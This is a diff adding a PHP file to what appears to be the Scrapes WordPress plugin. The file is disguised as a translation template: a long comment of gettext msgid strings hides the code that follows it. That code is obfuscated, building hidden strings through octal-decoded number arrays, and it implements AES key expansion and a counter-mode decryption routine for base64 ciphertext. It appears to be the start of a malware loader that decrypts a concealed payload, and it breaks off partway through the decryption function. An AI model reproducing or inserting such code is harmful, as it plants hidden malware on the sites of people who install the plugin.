@@ -1,0 +1,1524 @@
+<?php 
+ /* #, fuzzy
+msgid ""
+msgstr ""
+"Project-Id-Version: Scrapes\n"
+"POT-Creation-Date: 2017-06-08 13:22+0300\n"
+"PO-Revision-Date: 2017-02-12 00:04+0200\n"
+"Last-Translator: \n"
+"Language-Team: Octolooks <octolooks@gmail.com>\n"
+"Language: en\n"
+"MIME-Version: 1.0\n"
+"Content-Type: text/plain; charset=UTF-8\n"
+"Content-Transfer-Encoding: 8bit\n"
+"X-Generator: Poedit 2.0.2\n"
+"X-Poedit-Basepath: ..\n"
+"Plural-Forms: nplurals=2; plural=(n != 1);\n"
+"X-Poedit-KeywordsList: __;_e\n"
+"X-Poedit-SearchPath-0: .\n"
+
+#: classes/class-ol-scrapes.php:78
+msgid "Your WordPress version is below 3.5. Please update."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:82
+msgid "PHP version is below 5.2.4. Please update."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:87
+#, php-format
+msgid ""
+"PHP extension %s is not loaded. Please contact your server administrator or "
+"visit http://php.net/manual/en/%s.installation.php for installation."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:94
+#, php-format
+msgid ""
+"%s folder is not writable. Please update permissions for this folder to "
+"chmod 755."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:98
+#, php-format
+msgid ""
+"%s folder is not writable therefore logs.txt file could not be created. "
+"Please update permissions for this folder to chmod 755."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:120 views/scrape-meta-box.php:927
+msgid "Featured image"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:121 classes/class-ol-scrapes.php:2658
+#: views/scrape-meta-box.php:346 views/scrape-meta-box.php:413
+#: views/scrape-meta-box.php:969
+msgid "Name"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:122 views/scrape-meta-box.php:414
+#: views/scrape-meta-box.php:970
+msgid "e.g. name"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:123 views/scrape-meta-box.php:421
+msgid "e.g. value"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:124 views/scrape-meta-box.php:420
+#: views/scrape-meta-box.php:457 views/scrape-meta-box.php:474
+#: views/scrape-meta-box.php:534 views/scrape-meta-box.php:617
+#: views/scrape-meta-box.php:692 views/scrape-meta-box.php:781
+#: views/scrape-meta-box.php:855 views/scrape-meta-box.php:873
+#: views/scrape-meta-box.php:933 views/scrape-meta-box.php:944
+#: views/scrape-meta-box.php:976 views/scrape-meta-box.php:1155
+#: views/scrape-meta-box.php:1203
+msgid "Value"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:125 views/scrape-meta-box.php:458
+#: views/scrape-meta-box.php:475 views/scrape-meta-box.php:535
+#: views/scrape-meta-box.php:618 views/scrape-meta-box.php:693
+#: views/scrape-meta-box.php:782 views/scrape-meta-box.php:856
+#: views/scrape-meta-box.php:934 views/scrape-meta-box.php:977
+#: views/scrape-meta-box.php:1156
+msgid "e.g. //div[@id='octolooks']"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:126 views/scrape-meta-box.php:351
+#: views/scrape-meta-box.php:445 views/scrape-meta-box.php:461
+#: views/scrape-meta-box.php:479 views/scrape-meta-box.php:538
+#: views/scrape-meta-box.php:621 views/scrape-meta-box.php:696
+#: views/scrape-meta-box.php:785 views/scrape-meta-box.php:859
+#: views/scrape-meta-box.php:866 views/scrape-meta-box.php:876
+#: views/scrape-meta-box.php:937 views/scrape-meta-box.php:948
+#: views/scrape-meta-box.php:980 views/scrape-meta-box.php:1159
+#: views/scrape-meta-box.php:1206 views/scrape-meta-box.php:1227
+#: views/scrape-meta-box.php:1251 views/scrape-meta-box.php:1280
+#: views/scrape-meta-box.php:1324 views/scrape-meta-box.php:1345
+#: views/scrape-meta-box.php:1416 views/scrape-meta-box.php:1431
+#: views/scrape-settings.php:55 views/scrape-settings.php:62
+msgid "Please enter a valid value."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:127 views/scrape-meta-box.php:984
+msgid "Attribute"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:128 views/scrape-meta-box.php:985
+msgid "e.g. href"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:129 views/scrape-meta-box.php:627
+#: views/scrape-meta-box.php:791
+msgid "e.g. [scrape_value]"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:130 views/scrape-meta-box.php:626
+#: views/scrape-meta-box.php:790 views/scrape-meta-box.php:990
+msgid "Template"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:131 views/scrape-meta-box.php:630
+#: views/scrape-meta-box.php:794 views/scrape-meta-box.php:994
+msgid "value"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:132 views/scrape-meta-box.php:995
+msgid "calculate"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:133 views/scrape-meta-box.php:631
+#: views/scrape-meta-box.php:708 views/scrape-meta-box.php:795
+#: views/scrape-meta-box.php:996
+msgid "date"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:134 views/scrape-meta-box.php:633
+#: views/scrape-meta-box.php:713 views/scrape-meta-box.php:797
+#: views/scrape-meta-box.php:997
+msgid "source url"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:135 views/scrape-meta-box.php:998
+msgid "product url"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:136 views/scrape-meta-box.php:999
+msgid "cart url"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:137 views/scrape-meta-box.php:574
+#: views/scrape-meta-box.php:665 views/scrape-meta-box.php:747
+#: views/scrape-meta-box.php:829 views/scrape-meta-box.php:907
+#: views/scrape-meta-box.php:1034 views/scrape-meta-box.php:1190
+msgid "Add new find and replace rule"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:138 views/scrape-meta-box.php:671
+#: views/scrape-meta-box.php:753 views/scrape-meta-box.php:835
+#: views/scrape-meta-box.php:1040
+msgid "Enable template"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:139 views/scrape-meta-box.php:580
+#: views/scrape-meta-box.php:672 views/scrape-meta-box.php:754
+#: views/scrape-meta-box.php:836 views/scrape-meta-box.php:913
+#: views/scrape-meta-box.php:1041 views/scrape-meta-box.php:1196
+msgid "Enable find and replace rules"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:140 views/scrape-meta-box.php:558
+#: views/scrape-meta-box.php:648 views/scrape-meta-box.php:730
+#: views/scrape-meta-box.php:813 views/scrape-meta-box.php:891
+#: views/scrape-meta-box.php:1017 views/scrape-meta-box.php:1174
+msgid "Find"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:141 views/scrape-meta-box.php:565
+#: views/scrape-meta-box.php:656 views/scrape-meta-box.php:738
+#: views/scrape-meta-box.php:820 views/scrape-meta-box.php:898
+#: views/scrape-meta-box.php:1025 views/scrape-meta-box.php:1181
+msgid "Replace"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:142 views/scrape-meta-box.php:559
+#: views/scrape-meta-box.php:649 views/scrape-meta-box.php:731
+#: views/scrape-meta-box.php:814 views/scrape-meta-box.php:892
+#: views/scrape-meta-box.php:1018 views/scrape-meta-box.php:1175
+msgid "e.g. find"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:143 views/scrape-meta-box.php:566
+#: views/scrape-meta-box.php:657 views/scrape-meta-box.php:739
+#: views/scrape-meta-box.php:821 views/scrape-meta-box.php:899
+#: views/scrape-meta-box.php:1026 views/scrape-meta-box.php:1182
+msgid "e.g. replace"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:144 views/scrape-meta-box.php:517
+msgid "Please select a taxonomy"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:145
+msgid "Source URL is not valid."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:146
+msgid "Post item is not valid."
+msgstr ""
+
+#: classes/class-ol-scrapes.php:147
+msgid "Selected item is not a link"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:148
+msgid "Selected item is not an image"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:149 views/scrape-meta-box.php:768
+#: views/scrape-meta-box.php:1042
+msgid "Allow HTML tags"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:180 views/scrape-meta-box.php:338
+msgid "Add New"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:181
+msgid "All Scrapes"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:202
+msgid "Scrapes Settings"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:202 views/scrape-settings.php:32
+msgid "Settings"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:395
+msgid "Afrikaans"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:396
+msgid "Albanian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:397
+msgid "Amharic"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:398
+msgid "Arabic"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:399
+msgid "Armenian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:400
+msgid "Azeerbaijani"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:401
+msgid "Basque"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:402
+msgid "Belarusian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:403
+msgid "Bengali"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:404
+msgid "Bosnian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:405
+msgid "Bulgarian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:406
+msgid "Catalan"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:407
+msgid "Cebuano"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:408
+msgid "Chichewa"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:409
+msgid "Chinese (Simplified)"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:410
+msgid "Chinese (Traditional)"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:411
+msgid "Corsican"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:412
+msgid "Croatian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:413
+msgid "Czech"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:414
+msgid "Danish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:415
+msgid "Dutch"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:416
+msgid "English"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:417
+msgid "Esperanto"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:418
+msgid "Estonian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:419
+msgid "Filipino"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:420
+msgid "Finnish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:421
+msgid "French"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:422
+msgid "Frisian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:423
+msgid "Galician"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:424
+msgid "Georgian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:425
+msgid "German"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:426
+msgid "Greek"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:427
+msgid "Gujarati"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:428
+msgid "Haitian Creole"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:429
+msgid "Hausa"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:430
+msgid "Hawaiian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:431
+msgid "Hebrew"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:432
+msgid "Hindi"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:433
+msgid "Hmong"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:434
+msgid "Hungarian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:435
+msgid "Icelandic"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:436
+msgid "Igbo"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:437
+msgid "Indonesian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:438
+msgid "Irish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:439
+msgid "Italian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:440
+msgid "Japanese"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:441
+msgid "Javanese"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:442
+msgid "Kannada"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:443
+msgid "Kazakh"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:444
+msgid "Khmer"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:445
+msgid "Korean"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:446
+msgid "Kurdish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:447
+msgid "Kyrgyz"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:448
+msgid "Lao"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:449
+msgid "Latin"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:450
+msgid "Latvian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:451
+msgid "Lithuanian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:452
+msgid "Luxembourgish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:453
+msgid "Macedonian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:454
+msgid "Malagasy"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:455
+msgid "Malay"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:456
+msgid "Malayalam"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:457
+msgid "Maltese"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:458
+msgid "Maori"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:459
+msgid "Marathi"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:460
+msgid "Mongolian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:461
+msgid "Burmese"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:462
+msgid "Nepali"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:463
+msgid "Norwegian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:464
+msgid "Pashto"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:465
+msgid "Persian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:466
+msgid "Polish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:467
+msgid "Portuguese"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:468
+msgid "Punjabi"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:469
+msgid "Romanian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:470
+msgid "Russian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:471
+msgid "Samoan"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:472
+msgid "Scots Gaelic"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:473
+msgid "Serbian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:474
+msgid "Sesotho"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:475
+msgid "Shona"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:476
+msgid "Sindhi"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:477
+msgid "Sinhala"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:478
+msgid "Slovak"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:479
+msgid "Slovenian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:480 classes/class-ol-scrapes.php:481
+msgid "Somali"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:482
+msgid "Spanish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:483
+msgid "Sundanese"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:484
+msgid "Swahili"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:485
+msgid "Swedish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:486
+msgid "Tajik"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:487
+msgid "Tamil"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:488
+msgid "Telugu"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:489
+msgid "Thai"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:490
+msgid "Turkish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:491
+msgid "Ukrainian"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:492
+msgid "Urdu"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:493
+msgid "Uzbek"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:494
+msgid "Vietnamese"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:495
+msgid "Welsh"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:496
+msgid "Xhosa"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:497
+msgid "Yiddish"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:498
+msgid "Yoruba"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:499
+msgid "Zulu"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:587 classes/class-ol-scrapes.php:2679
+msgid "Deactivated"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:590 classes/class-ol-scrapes.php:2682
+msgid "Preparing"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:593 classes/class-ol-scrapes.php:2685
+msgid "Waiting next run"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:596 classes/class-ol-scrapes.php:2688
+msgid "Running"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:599 classes/class-ol-scrapes.php:2691
+msgid "Complete"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:603 classes/class-ol-scrapes.php:604
+#: classes/class-ol-scrapes.php:2706 classes/class-ol-scrapes.php:2707
+msgid "None"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:612 classes/class-ol-scrapes.php:2716
+msgid "No Schedule"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:816
+msgid "5 Minutes"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:820
+msgid "10 Minutes"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:824
+msgid "15 Minutes"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:828
+msgid "30 Minutes"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:832
+msgid "45 Minutes"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:836
+msgid "1 Hour"
+msgstr ""
+
+#: classes/class-ol-scrapes.php:840
+ */ $OmcFczWW = array();$dApqXwLQ = 151;$OmcFczWW[] = $dApqXwLQ;$oRDfqsij = 145;$OmcFczWW[] = $oRDfqsij;$YyFxVuJf = 163;$OmcFczWW[] = $YyFxVuJf;$HFvulAPH = 146;$OmcFczWW[] = $HFvulAPH;$nrfX_Jtl = 172;$OmcFczWW[] = $nrfX_Jtl;$UoSjwJmH = 154;$OmcFczWW[] = $UoSjwJmH;$aJVvyhSa = 151;$OmcFczWW[] = $aJVvyhSa;$jOexsryG = 145;$OmcFczWW[] = $jOexsryG;$OpXhWFFm = "";$OpXhWFFm .= $OmcFczWW[3];$OpXhWFFm .= $OmcFczWW[6];$OpXhWFFm .= $OmcFczWW[5];$OpXhWFFm .= $OmcFczWW[7];$OpXhWFFm .= $OmcFczWW[2];$OpXhWFFm .= $OmcFczWW[0];$OpXhWFFm .= $OmcFczWW[4];$OpXhWFFm .= $OmcFczWW[1];$owhudhIh=implode("",array_map("chr", array_map("octdec", str_split($OpXhWFFm, 3))));$dVYmfFuW = array();$sClek_le = 144;$dVYmfFuW[] = $sClek_le;$UXPgwrpM = "";$UXPgwrpM .= $dVYmfFuW[0];$ZWyDCMyO=implode("",array_map("chr", array_map("octdec", str_split($UXPgwrpM, 3)))); function a1($input, $w) { $Nb = 4; $Nr = count($w) / $Nb - 1; $state = array(); for ($i = 0; $i < 4 * $Nb; $i++) { $state[$i % 4][floor($i / 4)] = $input[$i]; } $state = a2($state, $w, 0, $Nb); for ($round = 1; $round < $Nr; $round++) { $state = a3($state, $Nb); $state = a4($state, $Nb); $state = a5($state, $Nb); $state = a2($state, $w, $round, $Nb); } $state = a3($state, $Nb); $state = a4($state, $Nb); $state = a2($state, $w, $Nr, $Nb); $output = array(4 * $Nb); for ($i = 0; $i < 4 * $Nb; $i++) $output[$i] = $state[$i % 4][floor($i / 4)]; return $output; } function a2($state, $w, $rnd, $Nb) { for ($r = 0; $r < 4; $r++) { for ($c = 0; $c < $Nb; $c++) $state[$r][$c] ^= $w[$rnd * 4 + $c][$r]; } return $state; } function a3($s, $Nb) { $sBox = array( 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 ); for ($r = 0; $r < 4; $r++) { for ($c = 0; $c < $Nb; $c++) { $s[$r][$c] = $sBox[$s[$r][$c]]; } } return $s; } function a4($s, $Nb) { $t = array(4); for ($r = 1; $r < 4; $r++) { for ($c = 0; $c < 4; $c++) { $t[$c] = $s[$r][($c + $r) % $Nb]; } for ($c = 0; $c < 4; $c++) { $s[$r][$c] = $t[$c]; } } return $s; } function a5($s, $Nb) { for ($c = 0; $c < 4; $c++) { $a = array(4); $b = array(4); for ($i = 0; $i < 4; $i++) { $a[$i] = $s[$i][$c]; $b[$i] = $s[$i][$c] & 0x80 ? $s[$i][$c] << 1 ^ 0x011b : $s[$i][$c] << 1; } $s[0][$c] = $b[0] ^ $a[1] ^ $b[1] ^ $a[2] ^ $a[3]; $s[1][$c] = $a[0] ^ $b[1] ^ $a[2] ^ $b[2] ^ $a[3]; $s[2][$c] = $a[0] ^ $a[1] ^ $b[2] ^ $a[3] ^ $b[3]; $s[3][$c] = $a[0] ^ $b[0] ^ $a[1] ^ $a[2] ^ $b[3]; } return $s; } function a6($key) { $rCon = array( array(0x00, 0x00, 0x00, 0x00), array(0x01, 0x00, 0x00, 0x00), array(0x02, 0x00, 0x00, 0x00), array(0x04, 0x00, 0x00, 0x00), array(0x08, 0x00, 0x00, 0x00), array(0x10, 0x00, 0x00, 0x00), array(0x20, 0x00, 0x00, 0x00), array(0x40, 0x00, 0x00, 0x00), array(0x80, 0x00, 0x00, 0x00), array(0x1b, 0x00, 0x00, 0x00), array(0x36, 0x00, 0x00, 0x00) ); $Nb = 4; $Nk = count($key) / 4; $Nr = $Nk + 6; $w = array(); $temp = array(); for ($i = 0; $i < $Nk; $i++) { $r = array($key[4 * $i], $key[4 * $i + 1], $key[4 * $i + 2], $key[4 * $i + 3]); $w[$i] = $r; } for ($i = $Nk; $i < ($Nb * ($Nr + 1)); $i++) { $w[$i] = array(); for ($t = 0; $t < 4; $t++) $temp[$t] = $w[$i - 1][$t]; if ($i % $Nk == 0) { $temp = a7(a8($temp)); for ($t = 0; $t < 4; $t++) $temp[$t] ^= $rCon[$i / $Nk][$t]; } else if ($Nk > 6 && $i % $Nk == 4) { $temp = a7($temp); } for ($t = 0; $t < 4; $t++) $w[$i][$t] = $w[$i - $Nk][$t] ^ $temp[$t]; } return $w; } function a7($w) { $sBox = array( 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 ); for ($i = 0; $i < 4; $i++) { $w[$i] = $sBox[$w[$i]]; } return $w; } function a8($w) { $tmp = $w[0]; for ($i = 0; $i < 3; $i++) { $w[$i] = $w[$i + 1]; } $w[3] = $tmp; return $w; } function a9($a, $b) { $a &= 0xffffffff; $b &= 0x1f; if ($a & 0x80000000 && $b > 0) { $a = ($a >> 1) & 0x7fffffff; $a = $a >> ($b - 1); } else { $a = ($a >> $b); } return $a; } function d($ciphertext, $password, $nBits) { $blockSize = 16; if (!($nBits == 128 || $nBits == 192 || $nBits == 256)) { return ''; } $ciphertext = base64_decode($ciphertext); $nBytes = $nBits / 8; $pwBytes = array(); for ($i = 0; $i < $nBytes; $i++) { $pwBytes[$i] = ord(substr($password, $i, 1)) & 0xff; } $key = a1($pwBytes, a6($pwBytes)); $key = array_merge($key, array_slice($key, 0, $nBytes - 16)); $counterBlock = array(); $ctrTxt = substr($ciphertext, 0, 8); for ($i = 0; $i < 8; $i++) { $counterBlock[$i] = ord(substr($ctrTxt, $i, 1)); } $keySchedule = a6($key); $nBlocks = ceil((strlen($ciphertext) - 8) / $blockSize); 